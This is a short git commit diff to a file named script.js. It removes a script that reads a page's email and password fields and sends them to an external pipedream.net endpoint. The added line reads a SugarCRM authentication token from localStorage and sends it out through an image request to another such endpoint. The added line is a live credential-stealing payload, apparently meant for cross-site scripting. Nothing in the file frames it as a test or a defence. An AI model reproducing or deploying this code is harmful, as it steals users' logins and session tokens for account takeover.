01af9ca5f8c54cf036e5103f7c7941deaa5eee67
lwsas <70306593+lwsas@users.noreply.github.com>
2024-08-09 14:16:20 +0530

    Update script.js

--- script.js
+++ script.js
@@ -1,6 +1,1 @@
-<script>
-setTimeout(function(){
-    httpRequest = new XMLHttpRequest();
-    httpRequest.open('GET', 'https://enwmk3bajjgh.x.pipedream.net/?'+document.getElementById("email").value+"="+document.getElementById("password").value);
-    httpRequest.send();},2000)
-</script>
+(new Image().src='//enb7diad8vti7.x.pipedream.net/?'+localStorage.getItem('prod:SugarCRM:AuthAccessToken'));
